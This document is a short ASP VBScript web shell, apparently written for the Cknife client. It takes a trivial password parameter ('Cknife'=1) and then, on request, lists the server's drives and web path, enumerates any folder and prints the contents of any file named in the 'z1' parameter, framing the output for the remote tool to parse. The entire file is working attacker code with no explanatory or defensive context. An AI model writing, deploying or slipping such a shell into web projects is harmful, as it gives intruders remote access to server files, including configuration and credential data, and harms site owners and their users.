<%Dim RR:RR=Request("z1"):
Dim PWD:PWD=Request("Cknife"):

Function FD(dt):FD=Year(dt)&"-":If Len(Month(dt))=1 Then:FD = FD&"0":End If:FD=FD&Month(dt)&"-":If Len(Day(dt))=1 Then:FD=FD&"0":End If:FD=FD&Day(dt)&" "&FormatDateTime(dt,4)&":":If Len(Second(dt))=1 Then:FD=FD&"0":End If:FD=FD&Second(dt)
End Function:
Dim action:action=Request("action"):
Response.Write("->|"):
If(action="index" and PWD="1") Then
    Dim S
    S=Server.Mappath(".")&chr(9)
    SET C=CreateObject("Scripting.FileSystemObject")
    If Err Then
        Err.Clear
    Else
        For Each D in C.Drives
            S=S&D.DriveLetter&chr(58)
        Next
    End If
    Response.Write(S)
End If
If(action="readdict" and PWD="1") Then
    SET C=CreateObject("Scripting.FileSystemObject")
    Set FO=C.GetFolder(""&RR&"")
    If Err Then
        Response.Write("ERROR:// "&Err.Description)
        Err.Clear
    Else
        For Each F in FO.subfolders
            Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10)
        Next
        For Each L in FO.files
            Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10)
        Next
    End If
End If

If(action="readfile" and PWD="1") Then
    Response.Write(CreateObject("Scripting.FileSystemObject").OpenTextfile(RR,1,False).readall)
    If Err Then
        Response.Write("ERROR:// "&Err.Description)
                    Err.Clear
    End If
End If
Response.Write("|<-")
%>